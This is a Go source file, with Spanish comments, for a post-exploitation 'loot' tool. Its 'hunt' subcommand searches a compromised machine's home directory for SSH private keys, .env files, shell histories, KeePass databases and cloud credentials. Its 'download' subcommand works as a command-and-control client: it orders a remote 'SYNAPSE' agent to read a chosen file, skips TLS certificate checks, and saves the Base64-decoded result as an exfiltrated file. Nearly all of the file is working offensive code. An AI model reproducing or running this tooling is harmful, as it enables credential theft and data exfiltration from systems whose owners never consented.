// FICHERO: botin.go (VERSIÓN 3.0 CON CLIENTE DE EXFILTRACIÓN INTEGRADO)
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

// --- TIPOS Y VARIABLES (sin cambios) ---
type LootRule struct {
	Description string
	Pattern     *regexp.Regexp
}

var lootRules = []LootRule{
	{Description: "Clave privada SSH", Pattern: regexp.MustCompile(`(?i)id_rsa$|id_dsa$|id_ed25519$`)},
	{Description: "Fichero de configuración .env", Pattern: regexp.MustCompile(`(?i)^\.env$`)},
	{Description: "Historial de Shell", Pattern: regexp.MustCompile(`(?i)\.(bash_history|zsh_history|history)$`)},
	{Description: "Base de datos KeePass", Pattern: regexp.MustCompile(`(?i)\.kdbx$`)},
	{Description: "Fichero con 'password' o 'secret'", Pattern: regexp.MustCompile(`(?i)password|secret|contraseña`)},
	{Description: "Configuración de cliente de AWS/GCP", Pattern: regexp.MustCompile(`(?i)^\.aws/credentials$|^\.config/gcloud/credentials\.db$`)},
}

// --- LÓGICA DE LOS COMANDOS ---

func NewLootCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "loot",
		Short: "Gestiona módulos de post-explotación y caza de botín",
		Long:  "Contiene herramientas para buscar y exfiltrar información valiosa de un sistema comprometido.",
	}
	cmd.AddCommand(newHuntCmd())
	cmd.AddCommand(newDownloadCmd())
	return cmd
}


// --- SUBCOMANDO: hunt ---
func newHuntCmd() *cobra.Command {
	var searchPath, missionName string
	cmd := &cobra.Command{
		Use:   "hunt",
		Short: "Busca archivos valiosos (botín) en el sistema de ficheros",
		Run: func(cmd *cobra.Command, args []string) {
			if searchPath == "" {
				homeDir, _ := os.UserHomeDir()
				searchPath = homeDir
			}
			runLootHunt(searchPath, missionName)
		},
	}
	cmd.Flags().StringVarP(&searchPath, "path", "p", "", "Ruta desde donde empezar la búsqueda (defecto: home)")
	cmd.Flags().StringVarP(&missionName, "mission", "m", "", "Nombre de la misión para guardar el botín encontrado")
	return cmd
}

func runLootHunt(rootPath, missionName string) {
	log.Printf("Iniciando caza de botín en: %s", rootPath)
	var foundLoot []string
	filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			if os.IsPermission(err) {
				return nil
			}
			return err
		}
		if info.IsDir() {
			return nil
		}
		for _, rule := range lootRules {
			if rule.Pattern.MatchString(info.Name()) {
				log.Printf("[+] ¡BOTÍN ENCONTRADO! [%s]: %s", rule.Description, path)
				foundLoot = append(foundLoot, path)
				break
			}
		}
		return nil
	})
	log.Printf("Caza de botín completada. Se encontraron %d archivos de interés.", len(foundLoot))
	if missionName != "" && len(foundLoot) > 0 {
		state, err := loadMissionState(missionName)
		if err != nil {
			log.Printf("ADVERTENCIA: No se pudo cargar la misión '%s': %v", missionName, err)
			return
		}
		hostname, _ := os.Hostname()
		lootLogEntry := fmt.Sprintf("Caza de botín en '%s' (%s) encontró %d archivos: %s", rootPath, hostname, len(foundLoot), strings.Join(foundLoot, ", "))
		state.Log = append(state.Log, LogEntry{Timestamp: time.Now(), Actor: "Sistema", Entry: lootLogEntry})
		saveMissionState(missionName, state)
		log.Printf("El botín encontrado ha sido registrado en el estado de la misión '%s'.", missionName)
	}
}

// --- SUBCOMANDO: download (AHORA ES UN CLIENTE DE C2) ---
func newDownloadCmd() *cobra.Command {
	var remotePath, localPath, agentHost, apiKey string
	var agentPort int

	cmd := &cobra.Command{
		Use:   "download",
		Short: "Descarga (exfiltra) un fichero conectándose a un agente SYNAPSE remoto",
		Long: `Actúa como un cliente de C2. Se conecta a un agente SYNAPSE remoto, le ordena
leer un fichero, recibe el contenido en Base64 y lo guarda localmente.`,
		Run: func(cmd *cobra.Command, args []string) {
			if remotePath == "" || agentHost == "" || apiKey == "" {
				log.Fatal("Error: Se requiere la ruta del fichero remoto (-f), el host del agente (-H) y la clave API (-k).")
			}

			// --- INICIO DE LA LÓGICA DE NOMENCLATURA MEJORADA ---
			// Si el usuario no especifica una ruta local con -o...
			if localPath == "" {
				// 1. Tomamos el nombre base del fichero remoto (ej. "secreto.txt")
				baseName := filepath.Base(remotePath)
				// 2. Añadimos el host del agente y la extensión .mon
				//    para crear un nombre único y descriptivo.
				localPath = fmt.Sprintf("%s_%s.mon", baseName, agentHost)
				log.Printf("No se especificó un fichero de salida. Se guardará como: %s", localPath)
			}
			// --- FIN DE LA LÓGICA DE NOMENCLATURA MEJORADA ---

			runLootDownloadClient(agentHost, agentPort, apiKey, remotePath, localPath)
		},
	}

	cmd.Flags().StringVarP(&remotePath, "file", "f", "", "Ruta completa del fichero a descargar en la máquina remota")
	cmd.Flags().StringVarP(&localPath, "output", "o", "", "Ruta local donde guardar el fichero (defecto: nombre original en la carpeta actual)")
	cmd.Flags().StringVarP(&agentHost, "agent-host", "H", "", "IP o hostname del agente SYNAPSE al que conectarse")
	cmd.Flags().IntVarP(&agentPort, "agent-port", "P", 4443, "Puerto del agente SYNAPSE")
	cmd.Flags().StringVarP(&apiKey, "key", "k", "", "Clave API secreta para autenticarse con el agente")

	return cmd
}

// runLootDownloadClient es la nueva lógica que actúa como cliente.
func runLootDownloadClient(host string, port int, key, remotePath, localPath string) {
	log.Printf("Conectando al agente SYNAPSE en https://%s:%d para exfiltrar '%s'...", host, port, remotePath)

	// 1. Construir la orden JSON para el agente
	orden := CommandRequest{
		Comando: "internal-download", // Usamos un "comando interno" para que el agente sepa qué hacer
		Args:    []string{remotePath},
	}
	jsonData, _ := json.Marshal(orden)

	// 2. Construir la petición HTTP
	url := fmt.Sprintf("https://%s:%d/command", host, port)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		log.Fatalf("Error al crear la petición: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-API-Key", key)

	// 3. Crear un cliente HTTP que ignore los certificados auto-firmados
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 60 * time.Second}

	// 4. Enviar la petición
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Error al conectar con el agente: %v", err)
	}
	defer resp.Body.Close()

	// 5. Procesar la respuesta
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Error al leer la respuesta del agente: %v", err)
	}
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("El agente respondió con un error (código %d): %s", resp.StatusCode, string(body))
	}

	var agentResponse CommandResponse
	if err := json.Unmarshal(body, &agentResponse); err != nil {
		log.Fatalf("Error al decodificar la respuesta JSON del agente: %v", err)
	}

	if agentResponse.Error != "" {
		log.Fatalf("El agente no pudo ejecutar la orden: %s", agentResponse.Error)
	}

	// 6. Decodificar el Base64 y guardar el fichero
	decodedBytes, err := base64.StdEncoding.DecodeString(agentResponse.Output)
	if err != nil {
		log.Fatalf("Error al decodificar el contenido Base64 recibido: %v", err)
	}

	err = os.WriteFile(localPath, decodedBytes, 0644)
	if err != nil {
		log.Fatalf("Error al guardar el fichero exfiltrado en '%s': %v", localPath, err)
	}

	log.Printf("¡Éxito! Fichero exfiltrado y guardado en: %s (%d bytes)", localPath, len(decodedBytes))
}
